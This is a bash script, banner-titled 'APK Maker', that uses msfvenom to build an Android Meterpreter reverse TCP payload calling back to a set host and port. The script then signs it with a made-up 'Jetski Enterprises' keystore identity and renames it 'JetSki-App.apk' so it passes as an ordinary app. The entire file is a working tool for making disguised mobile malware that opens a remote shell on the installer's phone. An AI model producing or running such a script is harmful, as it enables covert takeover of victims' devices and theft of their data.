#!/bin/bash

# Set the LHOST and LPORT for the reverse TCP payload
LHOST="192.168.1.124"
LPORT="4444"
APK_NAME="malware.apk"
OUTPUT_APK_NAME="JetSki-App.apk"

# Other variables
KEYSTORE="key.keystore"
ALIAS="hacked"
KEYALG="RSA"
KEYSIZE=2048
VALIDITY=10000
KEYPASS="password"
APKPASS="password"
DESKTOP_PATH="$HOME/Desktop"

echo "

 █████╗ ██████╗ ██╗  ██╗    ███╗   ███╗ █████╗ ██╗  ██╗███████╗██████╗ 
██╔══██╗██╔══██╗██║ ██╔╝    ████╗ ████║██╔══██╗██║ ██╔╝██╔════╝██╔══██╗
███████║██████╔╝█████╔╝     ██╔████╔██║███████║█████╔╝ █████╗  ██████╔╝
██╔══██║██╔═══╝ ██╔═██╗     ██║╚██╔╝██║██╔══██║██╔═██╗ ██╔══╝  ██╔══██╗
██║  ██║██║     ██║  ██╗    ██║ ╚═╝ ██║██║  ██║██║  ██╗███████╗██║  ██║
╚═╝  ╚═╝╚═╝     ╚═╝  ╚═╝    ╚═╝     ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
"

# Create the reverse TCP APK using msfvenom
echo "Generating APK with reverse TCP payload..."
msfvenom -p android/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -o $DESKTOP_PATH/$APK_NAME

# Check if msfvenom was successful, if not then exit the script
if [ $? -ne 0 ]; then
    echo "Error: Failed to generate the APK with msfvenom."
    exit 1
fi

APK_LOCATION="$DESKTOP_PATH/$APK_NAME"  # Path to the generated APK

# Create keystore if it doesn't exist then generate one thats Jetski themed using keytool
if [ ! -f "$KEYSTORE" ]; then
    echo "Creating keystore..."
    keytool -genkey -v -keystore $KEYSTORE -alias $ALIAS -keyalg $KEYALG -keysize $KEYSIZE -validity $VALIDITY -storepass $KEYPASS -keypass $APKPASS <<EOF
Jetski Enterprises
Water Works Dept.
We make jet skis Inc.
Springfield
Ontario
CA
yes
EOF
else
    echo "Keystore already exists."
fi

# Sign the APK
echo "Signing APK..."
jarsigner -verbose -keystore $KEYSTORE -storepass $KEYPASS -keypass $APKPASS $APK_LOCATION $ALIAS

# Align the APK using zipalign
echo "Aligning APK..."
zipalign -v 4 $APK_LOCATION $DESKTOP_PATH/$OUTPUT_APK_NAME

# Output the path to the signed and aligned APK
echo "Done. Signed and aligned APK is: $DESKTOP_PATH/$OUTPUT_APK_NAME"

echo "

██╗  ██╗ █████╗ ██████╗ ██████╗ ██╗   ██╗    ██╗  ██╗ █████╗  ██████╗██╗  ██╗██╗███╗   ██╗ ██████╗ 
██║  ██║██╔══██╗██╔══██╗██╔══██╗╚██╗ ██╔╝    ██║  ██║██╔══██╗██╔════╝██║ ██╔╝██║████╗  ██║██╔════╝ 
███████║███████║██████╔╝██████╔╝ ╚████╔╝     ███████║███████║██║     █████╔╝ ██║██╔██╗ ██║██║  ███╗
██╔══██║██╔══██║██╔═══╝ ██╔═══╝   ╚██╔╝      ██╔══██║██╔══██║██║     ██╔═██╗ ██║██║╚██╗██║██║   ██║
██║  ██║██║  ██║██║     ██║        ██║       ██║  ██║██║  ██║╚██████╗██║  ██╗██║██║ ╚████║╚██████╔╝
╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     ╚═╝        ╚═╝       ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝ ╚═════╝ 
"
